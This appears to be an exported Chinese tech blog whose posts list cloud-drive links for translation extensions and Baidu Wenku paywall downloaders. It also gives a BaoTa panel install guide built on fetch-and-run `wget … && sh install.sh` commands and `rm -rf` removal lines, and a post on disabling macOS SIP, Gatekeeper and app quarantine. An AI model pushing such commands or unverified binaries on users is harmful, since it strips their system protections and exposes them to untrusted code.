<h2 id="联想实时翻译Chrome插件CRX"><a href="#联想实时翻译Chrome插件CRX" class="headerlink" title="联想实时翻译Chrome插件CRX"></a>联想实时翻译Chrome插件CRX</h2><p><a href="https://wwm.lanzouw.com/i99VL0cmhgxg">https://wwm.lanzouw.com/i99VL0cmhgxg</a><br>密码:1pvx</p>
<h1 id="网页翻译"><a href="#网页翻译" class="headerlink" title="网页翻译"></a>网页翻译</h1><h2 id="Google-翻译-crx"><a href="#Google-翻译-crx" class="headerlink" title="Google-翻译.crx"></a>Google-翻译.crx</h2><p><a href="https://wwm.lanzouw.com/iaiOg09qtz3i">https://wwm.lanzouw.com/iaiOg09qtz3i</a><br>密码:66km</p>
<h1 id="划词翻译"><a href="#划词翻译" class="headerlink" title="划词翻译"></a>划词翻译</h1><h2 id="达达划词翻译-crx"><a href="#达达划词翻译-crx" class="headerlink" title="达达划词翻译.crx"></a>达达划词翻译.crx</h2><p><a href="https://wwm.lanzouw.com/i9Pfd0cmldaj">https://wwm.lanzouw.com/i9Pfd0cmldaj</a> 密码:1ft0</p>
<h2 id="划词翻译-crx"><a href="#划词翻译-crx" class="headerlink" title="划词翻译.crx"></a>划词翻译.crx</h2><p><a href="https://wwm.lanzouw.com/ifv250cmlydi">https://wwm.lanzouw.com/ifv250cmlydi</a> 密码:he9u</p>
<h1 id="字幕翻译"><a href="#字幕翻译" class="headerlink" title="字幕翻译"></a>字幕翻译</h1><h2 id="YouTube™-双字幕-crx"><a href="#YouTube™-双字幕-crx" class="headerlink" title="YouTube™-双字幕.crx"></a>YouTube™-双字幕.crx</h2><p><a href="https://wwm.lanzouw.com/izLMD0cmlyej">https://wwm.lanzouw.com/izLMD0cmlyej</a><br>密码:8w45</p>
<h1 id="翻译软件"><a href="#翻译软件" class="headerlink" title="翻译软件"></a>翻译软件</h1><h2 id="有道词典绿色版-8-10-7-0-rar"><a href="#有道词典绿色版-8-10-7-0-rar" class="headerlink" title="有道词典绿色版 8.10.7.0.rar"></a>有道词典绿色版 8.10.7.0.rar</h2><p><a href="https://wwm.lanzouw.com/ilmvo0dj3ife">https://wwm.lanzouw.com/ilmvo0dj3ife</a><br>密码:hpvv</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>translate</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>translate</tag>
      </tags>
  </entry>
  <entry>
    <title>百度文库下载器</title>
    <url>/posts/5ef3efeb/</url>
    <content><![CDATA[<h1 id="百度文库下载助手地址"><a href="#百度文库下载助手地址" class="headerlink" title="百度文库下载助手地址"></a>百度文库下载助手地址</h1><p>百度文库下载助手：<a href="https://imwcr.cn/api/GetDocumentText/">https://imwcr.cn/api/GetDocumentText/</a></p>
<h1 id="免费百度文库下载器地址"><a href="#免费百度文库下载器地址" class="headerlink" title="免费百度文库下载器地址"></a>免费百度文库下载器地址</h1><p>默认验证码（如果失效，自行获取）：mohuli<br>百度文库下载器：<a href="https://www.xiawenku.cn/">https://www.xiawenku.cn/</a></p>
<h1 id="百度文库文档免费在线解析工具地址"><a href="#百度文库文档免费在线解析工具地址" class="headerlink" title="百度文库文档免费在线解析工具地址"></a>百度文库文档免费在线解析工具地址</h1><p>百度文库在线解析工具：<a href="https://www.tool77.com/wenku">https://www.tool77.com/wenku</a></p>
<h1 id="xx文库下载器"><a href="#xx文库下载器" class="headerlink" title="xx文库下载器"></a>xx文库下载器</h1><p><a href="https://wwm.lanzouw.com/iWio50co3i1e">https://wwm.lanzouw.com/iWio50co3i1e</a> 密码:herq</p>
<h1 id="xx文库下载器2-2-1-win11"><a href="#xx文库下载器2-2-1-win11" class="headerlink" title="xx文库下载器2.2.1_win11"></a>xx文库下载器2.2.1_win11</h1><p> <a href="https://wwm.lanzouw.com/id5EM0coewad">https://wwm.lanzouw.com/id5EM0coewad</a> 密码:2dqb</p>
<h1 id="Yoco-0-1-1-alpha-x86-单文件"><a href="#Yoco-0-1-1-alpha-x86-单文件" class="headerlink" title="Yoco_0.1.1.alpha_x86_单文件"></a>Yoco_0.1.1.alpha_x86_单文件</h1><p><a href="https://wwm.lanzouw.com/iQB4R0coewyh">https://wwm.lanzouw.com/iQB4R0coewyh</a> 密码:6e6m</p>
<h1 id="百度文库下载助手"><a href="#百度文库下载助手" class="headerlink" title="百度文库下载助手"></a>百度文库下载助手</h1><p><a href="https://imwcr.cn/api/GetDocumentText/">https://imwcr.cn/api/GetDocumentText/</a></p>
<h1 id="bd-download1"><a href="#bd-download1" class="headerlink" title="bd_download1"></a>bd_download1</h1><p><a href="https://wwm.lanzouw.com/iexvV0e0qc6j">https://wwm.lanzouw.com/iexvV0e0qc6j</a> 密码:832b</p>
<h1 id="稻壳阅读器-2-10-36便携版"><a href="#稻壳阅读器-2-10-36便携版" class="headerlink" title="稻壳阅读器_2.10.36便携版"></a>稻壳阅读器_2.10.36便携版</h1><p><a href="https://wwm.lanzouw.com/iQydO0e0qc9c">https://wwm.lanzouw.com/iQydO0e0qc9c</a> 密码:bbb9</p>
<h1 id="文库下载器"><a href="#文库下载器" class="headerlink" title="文库下载器"></a>文库下载器</h1><p><a href="https://wwm.lanzouw.com/i0Zfx0g0sxkd">https://wwm.lanzouw.com/i0Zfx0g0sxkd</a> 密码:8d2p</p>
<h1 id="小叶文库下载器"><a href="#小叶文库下载器" class="headerlink" title="小叶文库下载器"></a>小叶文库下载器</h1><p><a href="https://wwm.lanzouw.com/iUR8C0g0swwj">https://wwm.lanzouw.com/iUR8C0g0swwj</a> 密码:6ofn</p>
<h1 id="文库下载器BY小叶复活版"><a href="#文库下载器BY小叶复活版" class="headerlink" title="文库下载器BY小叶复活版"></a>文库下载器BY小叶复活版</h1><p><a href="https://wwm.lanzouw.com/ipzN40g6tztg">https://wwm.lanzouw.com/ipzN40g6tztg</a> 密码:e6yb</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>wenku</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>wenku</tag>
      </tags>
  </entry>
  <entry>
    <title>paper2gui 小白兔ai（语音合成、视频补帧、视频超分、目标检测、图片风格化、ocr识别）</title>
    <url>/posts/1942d331/</url>
    <content><![CDATA[<p>Paper2GUI中文名叫小白兔AI，一款面向普通人且功能强度大的AI桌面APP工具箱，免安装即开即用，已支持18+AI模型，内容涵盖语音合成、视频补帧、视频超分、目标检测、图片风格化、OCR识别等领域。支持Windows、Mac、Linux系统（还在适配中，目前仅支持Windows下载），未来还将适配安卓和苹果设备，另外还有小程序。</p>
<p>小白兔AI – 聚合版功能 统一、全面、高效的小白兔AI，依赖强大的自研AI引擎，整合并持久优化，现已支持抠图、人像动漫化、动漫超分辨、音频降噪、语音合成、OCR识别等十余种AI功能，GPU加速推理，Inter、NVDIA、AMD全支持。</p>
<p>软件现已支持手动调整并发数，可根据设备显卡体质自行调整，实现GPU的最大化利用率，因此不论是笔记本低端显卡还是RTX 3090TI都能充分释放设备性能。</p>
<p>AI桌面APP工具箱 小白兔AI 下载地址 小白兔AI（Paper2GUI ）<br>GitHub页面：<a href="https://github.com/Baiyuetribe/paper2gui">https://github.com/Baiyuetribe/paper2gui</a><br>Windows直达下载地址：<a href="https://download.fastgit.org/Baiyuetribe/paper2gui/releases/download/Published/XiaoBaituAI_windows.zip">https://download.fastgit.org/Baiyuetribe/paper2gui/releases/download/Published/XiaoBaituAI_windows.zip</a></p>
]]></content>
      <categories>
        <category>tool</category>
        <category>paper2gui</category>
      </categories>
      <tags>
        <tag>paper2gui</tag>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title>宝塔面板搭建typecho/wordpress等博客教程</title>
    <url>/posts/22657a29/</url>
    <content><![CDATA[<h1 id="宝塔一键安装代码"><a href="#宝塔一键安装代码" class="headerlink" title="宝塔一键安装代码"></a>宝塔一键安装代码</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#CentOS系统</span></span><br><span class="line">yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh</span><br><span class="line"><span class="comment">#Ubuntu系统</span></span><br><span class="line">wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh</span><br><span class="line"><span class="comment">#Debian系统</span></span><br><span class="line">wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; bash install.sh</span><br></pre></td></tr></table></figure>

<p><img src="/img/bt/1.webp" alt="9a139a81b879966c2c60933bd09cee7a"><br>安装完成后会显示外网地址，账号，密码</p>
<p>提示：如果我们后续未修改密码却忘记了密码的话，可以在SSH客户端使用命令bt default来查看安装后的默认后台信息。</p>
<h1 id="选择环境"><a href="#选择环境" class="headerlink" title="选择环境"></a>选择环境</h1><p><img src="/img/bt/2.webp" alt="601263c5943bca44998fa6f0bb8a69e2"><br>这里建议选择LNMP，环境为Nginx 1.15、PHP 7.2、Mysql 5.5，如果内存1G建议选择Mysql 5.6、2G选择5.7。选择好了后点击一键安装即可。</p>
<p>提示：如果你弹不出这个环境安装提示，可以点击左侧软件管理，再手动选择安装。</p>
<h1 id="一键部署源码-失效）"><a href="#一键部署源码-失效）" class="headerlink" title="一键部署源码(失效）"></a>一键部署源码(失效）</h1><p>安装完成后，点击左侧软件管理-宝塔插件，安装宝塔一键部署源码，装好后点击设置<br><img src="/img/bt/3.webp" alt="44bfb797b5793445c921c953207f445d"></p>
<p>然后选择博客一栏，会出现一些常用的博客程序。<br><img src="/img/bt/4.webp" alt="7e8793d7d9fc7d57184f3c1e16034b4b"><br>根据自己的喜好选择一个博客程序，然后点击一键部署。<br>关于程序选择，这里建议首选Wordpress或者Typecho，大致区别如下：<br>Wordpress：使用人数全球最多，插件、模板都多，可定制性强，不过收费主题都有点贵。<br>Typecho：也就是博主现在使用的程序，轻巧，后台简洁，挺适合做个人博客，但搞其它的就不适合了。</p>
<h1 id="下载typecho源码"><a href="#下载typecho源码" class="headerlink" title="下载typecho源码"></a>下载typecho源码</h1><p><a href="https://github.com/typecho/typecho/releases/latest/download/typecho.zip">https://github.com/typecho/typecho/releases/latest/download/typecho.zip</a><br>将压缩包上传到网站根目录，解压缩里面的文件</p>
<h1 id="填解析到ip的域名"><a href="#填解析到ip的域名" class="headerlink" title="填解析到ip的域名"></a>填解析到ip的域名</h1><p>然后会要你填入域名，也就是你解析到这个服务器ip的域名<br><img src="/img/bt/5.webp" alt="882299d2104af6235417deadf040bb79"></p>
<h1 id="获取数据库名、用户名和密码"><a href="#获取数据库名、用户名和密码" class="headerlink" title="获取数据库名、用户名和密码"></a>获取数据库名、用户名和密码</h1><p>提交后，初步算安装完成了，然后记住给你的数据库名、用户名和密码。<br><img src="/img/bt/6.webp" alt="fb799c9f72a2da1c4434321d33209d8a"></p>
<h1 id="伪静态"><a href="#伪静态" class="headerlink" title="伪静态"></a>伪静态</h1><p>再点击左侧的网站，找到你的域名，点击设置。<br><img src="/img/bt/7.webp" alt="f48e632ec366b7d85d326d64f5a8a19c"><br>再点击伪静态，选择自己所安装的程序名称，比如Typecho，再点击保存即可。<br><img src="/img/bt/8.webp" alt="9124d16febe6902cbe1211f0d6dca954"><br>此时到这里基本上就算部署完成了，然后打开你的域名，填入数据库信息，管理员信息安装即可。</p>
<h1 id="SSL"><a href="#SSL" class="headerlink" title="SSL"></a>SSL</h1><p>如果你还想域名有逼格点，比如浏览器那里显示一把小绿锁，那么再点击域名设置，找到SSL，填入邮箱，点击申请，然后再开启右上角的强制HTTPS。<br><img src="/img/bt/9.webp" alt="8bd3ba5ba7829b9618ae1b76b0209fe0"><br>此时，你在浏览器上也有了小绿锁。</p>
<h1 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h1><p>最后记得勤备份博客的数据，只需要备份网站根目录的文件和数据库就行了。<br>1、数据库备份<br>点击左侧数据库，找到博客所使用的数据库，点击导出就行了。</p>
<p>2、根目录备份<br>一般根目录路径为&#x2F;www&#x2F;wwwroot&#x2F;<a href="http://www.cnidc.co,然后通过左侧的文件,找到该目录,点击全选,压缩,再下载本地即可./">www.cnidc.co，然后通过左侧的文件，找到该目录，点击全选，压缩，再下载本地即可。</a></p>
<h1 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h1><h2 id="一：脚本卸载"><a href="#一：脚本卸载" class="headerlink" title="一：脚本卸载"></a>一：脚本卸载</h2><p>你需要先在面板中将通过面板安装的所有软件卸载，如 nginx、mysql、php 等等，然后，进入 SSH 命令行，输入以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/init.d/bt stop &amp;&amp; <span class="built_in">rm</span> -f /etc/init.d/bt &amp;&amp; <span class="built_in">rm</span> -rf /www/server/panel</span><br></pre></td></tr></table></figure>
<p>这样卸载已经完成，我们可以试着去打开面板，发现已经打不开了。</p>
<h2 id="二：脚本卸载"><a href="#二：脚本卸载" class="headerlink" title="二：脚本卸载"></a>二：脚本卸载</h2><p> 还是脚本卸载，不过这个更暴力一点，直接是都卸载，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://download.bt.cn/install/bt-uninstall.sh</span><br><span class="line">sh bt-uninstall.sh</span><br></pre></td></tr></table></figure>
<p>这样就完全卸载了整个面板以及环境。</p>
<h2 id="三：后续的解决"><a href="#三：后续的解决" class="headerlink" title="三：后续的解决"></a>三：后续的解决</h2><p>虽然卸载了面板以及面板环境，可是，系统还是会残留一些文件的，比如 www 目录，网站文件，<br>如果不需要刻意删除，防止安装别的面时候出现一些错误，如何删除，我们可以用命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> –rf www</span><br></pre></td></tr></table></figure>
<p>强制删除 www 文件夹</p>
]]></content>
      <categories>
        <category>web</category>
        <category>wordpress</category>
        <category>typecho</category>
        <category>bt</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>wordpress</tag>
        <tag>type</tag>
        <tag>bt</tag>
      </tags>
  </entry>
  <entry>
    <title>intel mac 用 bootcamp 装 windows、macos 双系统</title>
    <url>/posts/f41474b2/</url>
    <content><![CDATA[<p>Launchpad —— Boot Camp</p>
<p>系统镜像文件网站<br><a href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn/</a></p>
<p>Windows 10 x64 镜像<br>ed2k:&#x2F;&#x2F;|file|cn_Windows_10_multiple_editions_x64_dvd_6848463.iso|4303300608|94FD861E82458005A9CA8E617379856A|&#x2F;</p>
]]></content>
      <categories>
        <category>os</category>
        <category>macos</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>macos</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>microsoft store离线下载工具</title>
    <url>/posts/4169fcc9/</url>
    <content><![CDATA[<h1 id="Microsoft-Store应用商店程序离线安装包提取工具地址"><a href="#Microsoft-Store应用商店程序离线安装包提取工具地址" class="headerlink" title="Microsoft Store应用商店程序离线安装包提取工具地址"></a>Microsoft Store应用商店程序离线安装包提取工具地址</h1><p><a href="https://store.rg-adguard.net/">https://store.rg-adguard.net/</a> </p>
<h1 id="Microsoft-Store离线下载工具下载地址-获取商店应用-Dev"><a href="#Microsoft-Store离线下载工具下载地址-获取商店应用-Dev" class="headerlink" title="Microsoft Store离线下载工具下载地址 获取商店应用(Dev)"></a>Microsoft Store离线下载工具下载地址 获取商店应用(Dev)</h1><p>github 地址：<br><a href="https://github.com/Gaoyifei1011/GetStoreApp">https://github.com/Gaoyifei1011/GetStoreApp</a><br>下载直达：获取商店应用(Dev) 0.5.6.0<br><a href="https://github.com/Gaoyifei1011/GetStoreApp/releases/tag/v0.5.6.0">https://github.com/Gaoyifei1011/GetStoreApp/releases/tag/v0.5.6.0</a></p>
]]></content>
      <categories>
        <category>os</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>pc运行安卓应用新选择，代替win11安卓子系统</title>
    <url>/posts/199eac7e/</url>
    <content><![CDATA[<p>官方网站：<br><a href="https://www.wndroid.com/">https://www.wndroid.com/</a><br>官方下载：<br><a href="https://www.wndroid.com/downLoad">https://www.wndroid.com/downLoad</a></p>
]]></content>
      <categories>
        <category>os</category>
        <category>android</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>windows</tag>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>macos如何绕过安全措施</title>
    <url>/posts/d6fa3642/</url>
    <content><![CDATA[<p>macOS在安全措施上做得非常不错，导致很多软件都被严密的Apple拒之门外。本文就向大家介绍几个有效的终端脚本，它们能让你无视大部分安全措施。</p>
<h1 id="1-csrutil-disable-sudo-mount-uw"><a href="#1-csrutil-disable-sudo-mount-uw" class="headerlink" title="1. csrutil disable &amp; sudo mount -uw &#x2F;"></a>1. csrutil disable &amp; sudo mount -uw &#x2F;</h1><p>注意：第一个脚本得在Recovery OS中运行。</p>
<p>从macOS Sierra开始，Apple便新增了一项安全措施——SIP（System Integrity Protection）。它会让你禁止访问根目录的大多数文件夹以及系统文件夹。在macOS Sierra到macOS Mojave这些系统中，运行这行脚本能让你完全读写整个磁盘。</p>
<p>如何进入Recovery系统？</p>
<p>在开机时，一听到开机声音，就立马按下command ⌘ + R，等进度条走一半时假如看到鼠标，并且进系统看到了恢复助理，那么你就进入Recovery系统了。</p>
<p>在Recovery系统中，我该如何运行这行脚本？<br>在顶部的菜单栏中，选择“实用工具 - 终端”，输入这行脚本就可以了。重新启动，这次不要按command ⌘ + R，就可以进入正常系统了。在系统的终端里输入“csrutil status”，如果显示“disabled”，那么就表示成功了。接下来再运行这行脚本（在正常系统中）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mount -uw /</span><br><span class="line">killal Finder</span><br></pre></td></tr></table></figure>
<p>便可以进行根目录读写了。</p>
<p>不过遗憾的是，早在Catalina时期，Apple便对这些“黑客”们严格管控，在macOS Catalina里面加入了一项措施——尽管用户执行“csrutil disable”，也无法进行根目录读写了，甚至执行第二个脚本还会报错。现在只能通过建立软链接data的方法，十分麻烦。但是诸如AdGuard、cDock之类的软件，还是需要依赖“csrutil disable”这行脚本的。</p>
<h1 id="2-sudo-spctl-–master-disable：绕过GateKeeper"><a href="#2-sudo-spctl-–master-disable：绕过GateKeeper" class="headerlink" title="2. sudo spctl –master-disable：绕过GateKeeper"></a>2. sudo spctl –master-disable：绕过GateKeeper</h1><p>Apple还有一项安全措施：GateKeeper。很多软件，Apple无法验证它是什么开发者开发的，便会弹出“请移到废纸篓”这样的窗口。其实，很多软件都是无辜的。在终端运行这行脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo spctl --master-disable</span><br></pre></td></tr></table></figure>
<p>再运行，便可正常启动了。如果还是这样的话，请到“系统偏好设置 - 安全性与隐私 - 通用”里面开锁，选择“允许此App”。</p>
<h1 id="3-sudo-xattr-r-d-com-apple-quarantine-Applications-example-app-sudo-codesign-–force-–deep-–sign-Application-example-app：重新签名"><a href="#3-sudo-xattr-r-d-com-apple-quarantine-Applications-example-app-sudo-codesign-–force-–deep-–sign-Application-example-app：重新签名" class="headerlink" title="3. sudo xattr -r -d com.apple.quarantine &#x2F;Applications&#x2F;example.app &amp; sudo codesign –force –deep –sign - &#x2F;Application&#x2F;example.app：重新签名"></a>3. sudo xattr -r -d com.apple.quarantine &#x2F;Applications&#x2F;example.app &amp; sudo codesign –force –deep –sign - &#x2F;Application&#x2F;example.app：重新签名</h1><p>Apple的安全措施可谓是百花齐放，各式各样。Apple为了保护各个开发者，当App内部出现改动时，再打开，便会出现“App无法打开”这样的弹窗。这时候，你可以运行这样的脚本：<br>#将App拖到这两行后面：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo xattr -r -d com.apple.quarantine </span><br><span class="line">sudo codesign --force --deep --sign - </span><br></pre></td></tr></table></figure>
<p>然后便可以打开了。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>macos</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>macos</tag>
      </tags>
  </entry>
  <entry>
    <title>macos如何重装系统</title>
    <url>/posts/c4766188/</url>
    <content><![CDATA[<p>众所周知，macOS相对Windows来说用户要少一些，软件要少一些，自然懂得的用户也要少一些。本文就向大家介绍一下macOS如何重装系统。</p>
<h1 id="方法一：系统恢复模式快速重装（推荐）"><a href="#方法一：系统恢复模式快速重装（推荐）" class="headerlink" title="方法一：系统恢复模式快速重装（推荐）"></a>方法一：系统恢复模式快速重装（推荐）</h1><p>macOS里面自带一个恢复模式，里面有重装系统的方式。关于如何进入恢复模式，请查看我的文章<a href="https://macin.top/archives/macos-ru-he-rao-guo-an-quan-cuo-shi">macOS如何绕过安全措施</a></p>
<p>进入恢复模式之后，在不进行操作下，系统将会弹出一个窗口，上面有“时间机器”、“重新安装macOS”，“Safari浏览器”以及“磁盘工具”。我们先点击“磁盘工具”进入。</p>
<p>进入磁盘工具之后，我们需要把系统磁盘抹掉（我是“Macintosh HD”和“Macintosh HD - 数据”都抹掉了），然后再把窗口关闭。这时候又回到了主界面，我们选择“重新安装macOS”，等待几十分钟，等它完成之后，再重新启动，便可以看到崭新的macOS了。</p>
<h1 id="方法二：macOS-Monterey：恢复出厂设置（快捷，但只支持部分机型）"><a href="#方法二：macOS-Monterey：恢复出厂设置（快捷，但只支持部分机型）" class="headerlink" title="方法二：macOS Monterey：恢复出厂设置（快捷，但只支持部分机型）"></a>方法二：macOS Monterey：恢复出厂设置（快捷，但只支持部分机型）</h1><p>在macOS Monterey当中，Apple添加了一个崭新的功能：恢复出厂设置。该功能可实现“无需重装，一键恢复”的功能。但遗憾的是，该功能只支持部分机型——比如2016年的MacBook Pro就支持，2017年的MacBook Air就不支持。</p>
<h1 id="方法三：系统安装程序“createvolumeinstallmedia”USB重装（繁琐，但可以随插随用）"><a href="#方法三：系统安装程序“createvolumeinstallmedia”USB重装（繁琐，但可以随插随用）" class="headerlink" title="方法三：系统安装程序“createvolumeinstallmedia”USB重装（繁琐，但可以随插随用）"></a>方法三：系统安装程序“createvolumeinstallmedia”USB重装（繁琐，但可以随插随用）</h1><p>准备：macOS安装程序（如不知如何准备的请查看我的文章“macOS完整安装程序下载”）、&gt;&#x3D;16GB的USB。</p>
<p>首先，我们先进入磁盘工具，选择你的U盘，然后把它抹掉成“Mac OS扩展 - 日志式”：</p>
<p>然后再打开终端（前提是应用程序文件夹里面要有安装程序），在终端执行以下脚本（需要输入密码，密码不显示，并且需要把SanDisk替换成你的USB名称，把安装程序名改成你的版本名称，这里以SanDisk和macOS Monterey为例）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /Applications/Install\ macOS\ Monterey.app/Contents/Resources/createinstallmedia --volume /Volumes/SanDisk/ /Applications/Install\ macOS\ Monterey.app --nointeraction</span><br></pre></td></tr></table></figure>
<p>等待Boot完成，重新启动。在听到开机声时，立马按下⌥（option）键，从USB启动（前提是有Apple T2安全芯片的得允许从外部驱动器启动），会发现它竟然是个Recovery界面。</p>
<p>跳转到方法一，按照步骤操作，便可以重装系统了。这种方法的好处是：只要把USB一插到电脑上，都可以顺利完成重装。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>macos</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>macos</tag>
      </tags>
  </entry>
  <entry>
    <title>谷歌翻译退出中国后如何使用谷歌翻译插件</title>
    <url>/posts/5351128a/</url>
    <content><![CDATA[<h1 id="1-下载安装SwitchHosts-SwitchHosts"><a href="#1-下载安装SwitchHosts-SwitchHosts" class="headerlink" title="1.下载安装SwitchHosts SwitchHosts"></a>1.下载安装SwitchHosts SwitchHosts</h1><p>官网：<a href="https://swh.app/">https://swh.app/</a><br>如果你网络不好，我下载了一份Windows x64版在蓝奏云盘<br><a href="https://wwm.lanzouw.com/iP7RT0ddlo3a">https://wwm.lanzouw.com/iP7RT0ddlo3a</a> 密码:8hp4</p>
<h1 id="2-添加hosts文件"><a href="#2-添加hosts文件" class="headerlink" title="2.添加hosts文件"></a>2.添加hosts文件</h1><p>点击SwitchHosts左上角的+号，添加一个本地hosts，名字自己起 180.163.151.34 translate.googleapis.com </p>
<h1 id="3-修改hosts文件"><a href="#3-修改hosts文件" class="headerlink" title="3.修改hosts文件"></a>3.修改hosts文件</h1><p>然后把这行文字复制进去保存：180.163.151.34 translate.googleapis.com </p>
<h1 id="4-SwitchHosts使用方法"><a href="#4-SwitchHosts使用方法" class="headerlink" title="4.SwitchHosts使用方法"></a>4.SwitchHosts使用方法</h1><p>找到你刚才起的名字，点击旁边的小开关即可开启，然后就可以顺利使用谷歌翻译插件了 </p>
<h1 id="5-QA：无法提示修改hosts没有权限"><a href="#5-QA：无法提示修改hosts没有权限" class="headerlink" title="5. QA：无法提示修改hosts没有权限"></a>5. QA：无法提示修改hosts没有权限</h1><h2 id="Windows用户"><a href="#Windows用户" class="headerlink" title="Windows用户"></a>Windows用户</h2><p>windows用户修改第一次修改hosts文件可能涉及到修改权限，可以定位到 C:\Windows\System32\drivers\etc\hosts 然后找到hosts文件，右键-属性-安全-点击编辑-在组或者用户选择User这一项（当前登录的用户），把修改和写入的权限勾选，然后点击确定，再弹出来的对话框选择是，然后逐步确定退出即可。 </p>
<h2 id="Mac用户"><a href="#Mac用户" class="headerlink" title="Mac用户"></a>Mac用户</h2><p>Mac用户比较简单，直接输入电脑密码即可。<br>当然网上也有一些一键的脚本，不过是针对谷歌翻译的，如果用这个SwitchHosts管理hosts的话，初次修改,Windows小白用户可能麻烦点，不过日后可与使用起来非常方便，可以使用一些hosts加速GitHub或者Google等等奇怪的技巧。</p>
<h1 id="手动改host复活谷歌翻译"><a href="#手动改host复活谷歌翻译" class="headerlink" title="手动改host复活谷歌翻译"></a>手动改host复活谷歌翻译</h1><p>Google翻译API突然不能用，其原因是Google重定向了中国的Google翻译网页版，直接把API也重定向了，所以我们通过修改hosts文件来实现谷歌翻译复活。</p>
<p>hosts路径：首先我们要知道我们的系统的hosts文件在哪里。下面给出了win、mac、Linux、Android和IOS的路径</p>
<pre><code>Windows：C:\Windows\System32\drivers\etc\hosts

Mac：/etc/hosts

Linux：/etc/hosts

Android：/system/etc/hosts

iOS：/etc/hosts
</code></pre>
<p>找谷歌国内IP ：谷歌在国内有很多服务器，我们要找到离自己最近的谷歌服务器IP，可以通过ping的方法，按win键+R，然后输入ping google.cn -t，按确定。</p>
<p>然后就能ping出你目前连得到的谷歌服务器IP地址，我的这里是203.208.40.66，记住这个IP地址。<br>上面是获取谷歌IP地址最直接的方法，当然你也可以打开下面的网址：<a href="https://ping.chinaz.com/translate.google.cn">https://ping.chinaz.com/translate.google.cn</a><br>自己找找离自己近一点的，比如我在广东，找广州的IP地址也可以。</p>
<p>修改hosts：上面找到了hotst所在的地址，用记事本打开hosts文件，把“地址+空格+translate.googleapis.com”输入在最后面。<br>例如我输入的是：<br>203.208.40.98 translate.googleapis.com</p>
<p>温馨提示：hosts文件如果是设置为只读了，可能会修改不了，大家右键-属性，然后把“只读”去掉勾即可。</p>
<p>最后保存，保存后再用谷歌即可正常翻译了，来看看我的浏览器，能正常翻译了喔！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">142.250.111.90 translate.googleapis.com</span><br><span class="line">172.217.215.90 translate.googleapis.com</span><br><span class="line">142.250.11.90 translate.googleapis.com</span><br><span class="line">142.251.9.90 translate.googleapis.com</span><br><span class="line">108.177.122.90 translate.googleapis.com</span><br><span class="line">142.250.96.90 translate.googleapis.com</span><br><span class="line">142.250.100.90 translate.googleapis.com</span><br><span class="line">142.250.110.90 translate.googleapis.com</span><br><span class="line">172.217.214.90 translate.googleapis.com</span><br><span class="line">172.217.222.90 translate.googleapis.com</span><br><span class="line">142.250.31.90 translate.googleapis.com</span><br><span class="line">142.250.126.90 translate.googleapis.com</span><br><span class="line">142.250.10.90 translate.googleapis.com</span><br><span class="line">172.217.195.90 translate.googleapis.com</span><br><span class="line">172.253.115.90 translate.googleapis.com</span><br><span class="line">142.251.5.90 translate.googleapis.com</span><br><span class="line">142.250.136.90 translate.googleapis.com</span><br><span class="line">142.250.12.90 translate.googleapis.com</span><br><span class="line">142.250.101.90 translate.googleapis.com</span><br><span class="line">172.217.192.90 translate.googleapis.com</span><br><span class="line">142.250.0.90 translate.googleapis.com</span><br><span class="line">142.250.107.90 translate.googleapis.com</span><br><span class="line">172.217.204.90 translate.googleapis.com</span><br><span class="line">142.250.28.90 translate.googleapis.com</span><br><span class="line">142.250.125.90 translate.googleapis.com</span><br><span class="line">172.253.124.90 translate.googleapis.com</span><br><span class="line">142.250.8.90 translate.googleapis.com</span><br><span class="line">142.250.128.90 translate.googleapis.com</span><br><span class="line">142.250.112.90 translate.googleapis.com</span><br><span class="line">142.250.27.90 translate.googleapis.com</span><br><span class="line">142.250.105.90 translate.googleapis.com</span><br><span class="line">172.253.126.90 translate.googleapis.com</span><br><span class="line">172.253.123.90 translate.googleapis.com</span><br><span class="line">172.253.122.90 translate.googleapis.com</span><br><span class="line">172.253.62.90 translate.googleapis.com</span><br><span class="line">142.250.98.90 translate.googleapis.com</span><br><span class="line">142.250.185.238 translate.googleapis.com</span><br><span class="line">142.251.116.101 translate.googleapis.com</span><br><span class="line">216.58.214.14 translate.googleapis.com</span><br><span class="line">142.250.189.206 translate.googleapis.com</span><br><span class="line">216.58.209.174 translate.googleapis.com</span><br><span class="line">142.250.203.142 translate.googleapis.com</span><br><span class="line">142.250.218.14 translate.googleapis.com</span><br><span class="line">142.251.10.138 translate.googleapis.com</span><br><span class="line">142.251.40.174 translate.googleapis.com</span><br><span class="line">142.250.185.174 translate.googleapis.com</span><br><span class="line">172.217.16.46 translate.googleapis.com</span><br><span 